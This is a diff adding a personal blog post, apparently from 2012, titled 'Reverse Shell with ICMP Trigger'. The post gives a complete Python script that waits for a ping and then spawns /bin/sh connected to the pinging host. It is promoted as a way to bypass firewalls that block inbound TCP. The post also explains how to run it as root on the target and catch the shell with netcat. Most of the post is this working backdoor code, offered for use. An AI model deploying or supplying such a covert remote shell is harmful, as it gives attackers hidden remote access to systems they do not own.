@@ -1,0 +1,123 @@
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+  <head>
+    <link rel="stylesheet" href="infocenter.css" type="text/css" />
+    <title>Kjetil's Information Center</title>
+  </head>
+  <body>
+    <div class="header">
+      <img src="infocenter_header.png" alt="Kjetil's Information Center: A Blog About My Projects"/>
+    </div>
+    <div class="menu">
+      <b>Index:</b>
+      <p>
+        <a href="index-topic.html">Index By Topic</a><br />
+        <a href="index.html">Index By Date</a><br />
+        <a href="rss.xml">RSS Feed</a><br />
+      </p>
+      <hr />
+      <b>Contact:</b>
+      <p>
+        <a href="https://github.com/kobolt">https://github.com/kobolt</a><br />
+        <a href="https://gitlab.com/users/kobolt/projects">https://gitlab.com/kobolt</a><br />
+        kobolt.anarion (at) gmail.com<br />
+      </p>
+      <hr />
+      <b>Quality assurance:</b>
+      <p>
+        <a href="http://validator.w3.org/check?uri=referer">
+          <img class="noborder"
+            src="valid-xhtml10.png"
+            alt="Valid XHTML 1.0 Strict" />
+        </a>
+        <br />
+        <a href="http://jigsaw.w3.org/css-validator/">
+          <img class="noborder" 
+            src="valid-css.gif"
+            alt="Valid CSS" />
+        </a>
+        <br />
+        <a href="https://validator.w3.org/feed/">
+          <img class="noborder"
+            src="valid-rss-rogers.png"
+            alt="Valid RSS" />
+        </a>
+        <br />
+      </p>
+    </div>
+    <div class="content">
+      <h1>Reverse Shell with ICMP Trigger</h1>
+      <p>
+        Here is a nifty way to spawn a reverse shell that I have been thinking about for a while. Basically, this script attempts to open a shell to a remote client if it receives an ICMP (ping) package from it. This can be used to bypass firewalls that drop all inbound TCP connections, but let ICMP packages through.<br />
+        <br />
+        Take a look:<br />
+      </p>
+        <div class="box">
+          <pre>
+#!/usr/bin/python
+
+import socket
+import struct
+import os
+
+def exec_shell(sock):
+    os.setgroups([])
+    os.setgid(99) # Nogroup
+    os.setuid(99) # Nobody
+    os.dup2(sock.fileno(), 0)
+    os.dup2(sock.fileno(), 1)
+    os.dup2(sock.fileno(), 2)
+    os.execve(&#34;/bin/sh&#34;, [&#34;/bin/sh&#34;, &#34;-i&#34;], {})
+
+def icmp_listen(connect_port):
+    icmp_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, &#92;
+        socket.getprotobyname(&#34;icmp&#34;))
+    icmp_sock.bind((&#39;&#39;, 1))
+
+    while True:
+        packet = icmp_sock.recv(1024)
+        header = struct.unpack(&#34;!LLL4s4sBBHHH&#34;, packet[:28])
+        data = packet[28:]
+
+        print &#34;Connecting to&#34;, socket.inet_ntoa(header[3]),
+        try:
+            shell_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            shell_sock.connect((socket.inet_ntoa(header[3]), connect_port))
+            print &#34;OK!&#34;
+        except Exception, e:
+            print &#34;Failed:&#34;, e
+            continue
+
+        pid = os.fork()
+        if (pid == 0):
+            os.setsid()
+            pid = os.fork()
+            if (pid == 0):
+                exec_shell(shell_sock)
+            else:
+                os._exit(0)
+
+if __name__ == &#34;__main__&#34;:
+    icmp_listen(1337)
+          </pre>
+        </div>
+      <p>
+        <br />
+        To use it, execute this script as root on the target host that will supply the shell. Then, on a remote client machine, use netcat to open a listening TCP port like so: &#34;nc -l -p 1337&#34;. Finally, from the same remote client, ping the target host.<br />
+        <br />
+      </p>
+      <i>
+        Topic:
+        <a href="index-topic.html#scripts_and_code">Scripts and Code</a>,
+        by
+        Kjetil
+        @ 
+        01/09-2012, 
+        <a href="article-69.html">Article Link</a>
+      </i>
+      <br />
+    </div>
+  </body>
+</html>
